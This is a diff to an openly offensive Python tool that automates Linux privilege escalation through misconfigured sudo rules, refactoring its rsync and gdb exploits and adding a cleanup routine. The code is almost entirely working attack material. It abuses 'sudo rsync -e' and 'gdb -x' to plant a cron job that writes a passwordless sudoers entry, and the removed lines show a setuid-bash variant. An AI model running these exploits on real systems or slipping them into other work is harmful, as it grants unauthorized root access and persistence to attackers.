@@ -98,6 +98,22 @@ def sleep_and_display(seconds, trigger_file = ''):
         sleep(1)
     print()
 
+def cleanup_files(got_root):
+    leave_exploit = os.getenv("LEAVE_EXPLOIT")
+
+    if leave_exploit == 'yes':
+        print(OKGREEN + "[!] LEAVING EXPLOIT IN PLACE \n" + ENDC)
+    else:
+        if got_root:
+            call("sudo rm " + pwncron_crond  + " > /dev/null 2>&1", shell=True)
+            call("sudo rm " + pwnsudoers_file  + " > /dev/null 2>&1", shell=True)
+
+    call("rm " + pwncron_script + " > /dev/null 2>&1", shell=True)
+    call("rm " + pwnage_script  + " > /dev/null 2>&1", shell=True)
+    call("rm " + pwncron_script  + " > /dev/null 2>&1", shell=True)
+    if got_root:
+        call("sudo rm " + pwnage_complete_file  + " > /dev/null 2>&1", shell=True)
+
 def pwnit(rule, exploit_cmd, pwnage_script_data, dry_run = False, comments = ""):
 
     rc = None    
@@ -165,6 +181,7 @@ def pwnit(rule, exploit_cmd, pwnage_script_data, dry_run = False, comments = "")
     if dry_run:
         print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
 
+    cleanup_files(rc)
     return rc
 
 # Function for the y/n questions
@@ -539,57 +556,34 @@ def tcpdump(tcpdump_user):
 # SUDO rsync Rule Pwnage
 def rsync(rsync_user):
 
+    rule = "rsync"
+    cmd = sudorules[rule]['fullcmd'].split(' ')[0]
+    pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
+    exploit_cmd = f"""
+    echo "cp {pwncron_script} {pwncron_crond}" > /tmp/pwnage.{rule}
+    chmod +x /tmp/pwnage.{rule}
+    touch /tmp/aaa{rule}
+    sudo {cmd} -e /tmp/pwnage.{rule} {username}@127.0.0.1:/tmp/aaa{rule} bbb
+    rm /tmp/aaa{rule} /tmp/pwnage.{rule}
+    """
+    comments = ""
+
     if args.info:
-        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
-        print(OKYELLOW + "\n[!] HOW TO PWN THIS RULE!!!" + ENDC)
-        print(OKBLUE + "[+] To pwn this rule multiple steps need to be taken." + ENDC)
-        print(OKBLUE + "[1] First create a malicious file in a partition that allows setuid: " + ENDC)
-        print(OKRED + " [*] echo 'cp /bin/bash /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh" + ENDC)
-        print(OKBLUE + "[2] Next we need to change that maliciouos file to be executable: " + ENDC)
-        print(OKRED + " [*] chmod +x /tmp/evil.sh" + ENDC)
-        print(OKBLUE + "[3] Next we need to create a empty file to pass to the rsync command: " + ENDC)
-        print(OKRED + " [*] touch /tmp/aaa" + ENDC)
-        print(OKBLUE + "[4] Next we will execute the rsync command in order to run our evil.sh script: " + ENDC)
-        if (rsync_user == "ALL") or (rsync_user == "root"):
-            print(OKRED + " [*] sudo rsync -e /tmp/evil.sh <username> @127.0.0.1:/tmp/aaa bbb" + ENDC)
-        else:
-            print(OKRED + " [*] sudo -u " + rsync_user + " rsync -e /tmp/evil.sh <username> @127.0.0.1:/tmp/aaa bbb" + ENDC)
-        print(OKBLUE + "[5] Finally execute your /tmp/pwnage file that was created!" + ENDC)
-        print(OKRED + " [*] ./pwnage" + ENDC)
-        print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------\n" + ENDC)
+
+        pwnit(rule, exploit_cmd, pwnage_script_data,True,comments)
         sys.exit()
-    
+
     elif args.autopwn:
 
-        question = ask_user( OKRED + "\n[?] Do you wish to abuse the rsync rule? " + ENDC)
+        question = ask_user(OKRED + f"\n[?] Do you wish to abuse the {rule} rule? " + ENDC)
 
         if question == True:
 
-            print(OKGREEN + "\n[!] Pwning the tcpdump rule now!!!" + ENDC)
-            print(OKGREEN + "\n[!] Creating malicious file!" + ENDC)
-            call("echo 'cp /bin/bash /tmp/pwnage ; chmod 4777 /tmp/pwnage' > /tmp/evil.sh", shell=True)
-            call("chmod +x /tmp/evil.sh", shell=True)
-
-            sleep(0.5)
-
-            print(OKGREEN + "\n[!] Creating /tmp/aaa file!" + ENDC)
-            call("touch /tmp/aaa",shell=True)
-
-            sleep(0.5)
-
-            print(OKGREEN + "\n[!] Running rsync command!" + ENDC)
-            
-            if (rsync_user == "ALL") or (rsync_user == "root"):
-                print(OKGREEN + "\n[!] Creating setuid shell as root!" + ENDC)
-                call("sudo rsync -e /tmp/evil.sh " + username + "@127.0.0.1:/tmp/aaa bbb", shell=True)
-            else:
-                print(OKGREEN + "\n[!] Creating setuid shell as " + rsync_user + "!" + ENDC)
-                call("sudo -u " + rsync_user + " rsync -e /tmp/evil.sh " + username + "@127.0.0.1:/tmp/aaa bbb", shell=True)
-
-            print(OKGREEN + "\n[!] EXECUTE /tmp/pwnage TO GET SHELL!" + ENDC)
+            pwnit(rule, exploit_cmd, pwnage_script_data,False,comments)
 
         if question == False:
             sudopwner()
+
 
 # SUDO awk Rule Pwnage
 def awk(awk_user):
@@ -990,9 +984,9 @@ def gdb(gdb_user):
     cmd = sudorules[rule]['fullcmd'].split(' ')[0]
     gdb_script = f"/tmp/gdb.{pid}"
     with open(gdb_script, 'w') as output_file:
-        output_file.write(f"!/bin/bash -c 'cp {pwncron_script} {pwncron_crond}'")
+        output_file.write(f"!/bin/bash -c 'cp {pwncron_script} {pwncron_crond}; rm {gdb_script}'")
     pwnage_script_data = f"#!/bin/bash\necho \"{username} ALL=(ALL) NOPASSWD: ALL\" > {pwnsudoers_file}\n"
-    exploit_cmd = f"sudo {cmd} -batch -x {gdb_script}"
+    exploit_cmd = f"sudo {cmd} -batch -x {gdb_script};"
     comments = ""
 
     if args.info:
